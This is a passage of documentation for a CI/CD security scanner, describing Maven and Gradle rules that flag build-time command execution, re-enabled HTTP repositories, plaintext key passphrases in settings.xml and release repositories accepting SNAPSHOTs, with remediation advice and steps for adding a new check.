- Build-time plugin execution is the dominant real-world Maven build-RCE primitive: a poisoned or misconfigured ``exec`` / ``antrun`` execution runs attacker-chosen commands on the build host. Same class as the npm lifecycle-script attacks and the xz-utils build-step backdoor, expressed through Maven's plugin lifecycle.

<div class="pg-rule__rec" markdown>

**Recommended action**

Review every lifecycle-bound execution of a command-running plugin (``exec-maven-plugin``, ``maven-antrun-plugin``, ``gmavenplus-plugin`` / ``groovy-maven-plugin``, ``frontend-maven-plugin``). When such a plugin has an ``<execution>`` tied to a phase, it runs arbitrary host commands on every ``mvn package`` / ``install`` / ``deploy``, with the build's privileges (CI runner write access, deploy keys, cloud credentials). Pinning the plugin version (MVN-012) does NOT remove this risk: a perfectly pinned ``exec-maven-plugin`` still runs whatever command its ``<configuration>`` names. Confirm the command and its inputs are trusted and constant (no downloaded script, no ``${}`` that an attacker can influence), move genuinely necessary code generation behind a reviewed, checked-in script, and drop any execution that isn't needed. Treat these executions as the build-RCE primitive they are.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## MVN-016: build.gradle re-enables HTTP via allowInsecureProtocol = true { #mvn-016 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-5</span> <span class="pg-tag pg-tag--esf">ESF-S-TRUSTED-REG</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-319</span>
</div>

Fires when a Gradle build script (``build.gradle`` / ``build.gradle.kts``) contains ``allowInsecureProtocol = true`` (the Groovy form) or ``isAllowInsecureProtocol = true`` (the Kotlin DSL property), the explicit opt-out Gradle 7+ requires to allow an ``http://`` repository.

Complements MVN-003 (an ``http://`` repository URL). MVN-003 matches the literal URL; this rule catches the enabling flag, which fires even when the URL itself is a property the regex extractor can't resolve to a literal ``http://`` string.

**Known false-positive modes**

- A build that only ever resolves from a trusted internal mirror on an isolated network segment may set the flag deliberately. Suppress per line with a rationale naming the network boundary; the HTTPS / TLS-proxy path is strictly safer.

**Seen in the wild**

- Gradle made ``http://`` repositories opt-in (requiring ``allowInsecureProtocol``) in Gradle 7 specifically because unencrypted artifact resolution is a man-in-the-middle surface; re-enabling it reopens that surface for both dependencies and build-script plugins.

<div class="pg-rule__rec" markdown>

**Recommended action**

Remove ``allowInsecureProtocol = true`` and serve the repository over HTTPS. Gradle 7+ refuses to resolve dependencies from an ``http://`` repository unless the build explicitly opts back in with this flag, precisely because a plain-HTTP repo is a MITM surface: anyone on the network path between the build and the repo can substitute the artifacts Gradle downloads (and Gradle resolves build-script plugins the same way, so the swap can be build-time RCE). Point the ``maven { url ... }`` at an HTTPS endpoint; if the repo can't terminate TLS, front it with a TLS-terminating reverse proxy rather than disabling the protection.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## MVN-017: settings.xml <server> ships a private key with an inline passphrase { #mvn-017 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-10</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-798</span> <span class="pg-tag pg-tag--cwe">CWE-522</span>
</div>

Reads ``<settings><servers><server>`` entries and fires when a ``<server>`` declares a ``<privateKey>`` AND a ``<passphrase>`` that carries a plaintext value, anything that is not the Maven-encrypted ``{...}`` form, an ``${...}`` property / env expansion, or empty.

The SSH / GPG-credential sibling of MVN-010 (a plaintext ``<password>``); it reuses the same encrypted-vs-``${}``-vs-plaintext discriminator. Lower frequency than ``<password>`` but higher blast radius: a leaked key + passphrase is a reusable deploy credential.

**Known false-positive modes**

- Local / sandbox settings.xml files used only against a throwaway key may carry a placeholder passphrase that looks like plaintext. Suppress per file with a rationale; a production settings.xml should never pair a real ``<privateKey>`` with a plaintext ``<passphrase>``.

**Seen in the wild**

- Same leak class as MVN-010: deploy credentials committed through settings.xml. A private key whose passphrase is stored next to it offers no protection once the file leaks, the passphrase is the only thing standing between a stolen key file and a working deploy credential.

<div class="pg-rule__rec" markdown>

**Recommended action**

Encrypt the ``<passphrase>`` or inject it at build time; never commit a private-key passphrase in plaintext alongside the key. The remediation mirrors MVN-010's password flow: run ``mvn --encrypt-password <passphrase>`` and paste the ``{...}`` token into ``<passphrase>``, with the master in ``~/.m2/settings-security.xml``; or use a property expansion (``${env.DEPLOY_KEY_PASSPHRASE}``) so the value lives in a CI secret, not on disk. A plaintext passphrase next to a ``<privateKey>`` path defeats the key passphrase entirely: anyone who reads the file (a repo clone, a CI cache, an archived backup) has both halves and can use the key to deploy. Prefer rotating to a CI-managed deploy credential over storing a long-lived key + passphrase in settings.xml at all.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## MVN-018: distributionManagement release repository accepts SNAPSHOTs { #mvn-018 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
</div>

Re-parses ``pom.xml`` and inspects the ``<distributionManagement><repository>`` element (the release deploy target, not the ``<snapshotRepository>``). Fires when that repository sets ``<snapshots><enabled>true``, which lets ``mvn deploy`` publish mutable ``-SNAPSHOT`` artifacts into the release repo.

Scoped tightly to the snapshot-acceptance angle: the ``http://`` deploy-URL half of distributionManagement hygiene is already MVN-003's surface. This rule is about a release target that doesn't hold its release-only guarantee.

**Known false-positive modes**

- Internal repositories that intentionally serve both releases and snapshots from one URL (a single Nexus / Artifactory hosted repo) may enable snapshots on the release target by design. Suppress per pom with a rationale; the cleaner posture is a dedicated ``<snapshotRepository>``.

<div class="pg-rule__rec" markdown>

**Recommended action**

Keep the ``<distributionManagement><repository>`` (the release deployment target) snapshot-free, and route mutable ``-SNAPSHOT`` builds to a separate ``<snapshotRepository>``. When the release repository enables snapshots (``<snapshots><enabled>true``), mutable ``-SNAPSHOT`` artifacts land in the same place consumers treat as immutable releases, so a coordinate that looks like a pinned release can be silently re-published with different bytes. Set ``<releases><enabled>true`` + ``<snapshots><enabled>false`` on the release repository, and declare a distinct ``<snapshotRepository>`` for in-development builds.

</div>

</div>

---

## Adding a new maven check

1. Create a new module at
   `pipeline_check/core/checks/maven/rules/mvnNNN_<name>.py`
   exporting a top-level `RULE = Rule(...)` and a `check(pom: PomFile) -> Finding`
   function. The orchestrator auto-discovers `RULE` and calls `check`
   with the ``PomFile``.
2. Add a mapping for the new ID in
   `pipeline_check/core/standards/data/owasp_cicd_top_10.py` (and any
   other standard that applies).
3. Drop unsafe/safe snippets at
   `tests/fixtures/per_check/maven/MVN-NNN.{unsafe,safe}.yml`
   and add a `CheckCase` entry in
   `tests/test_per_check_real_examples.py::CASES`.
4. Regenerate this doc:

   ```bash
   python scripts/gen_provider_docs.py maven
   ```
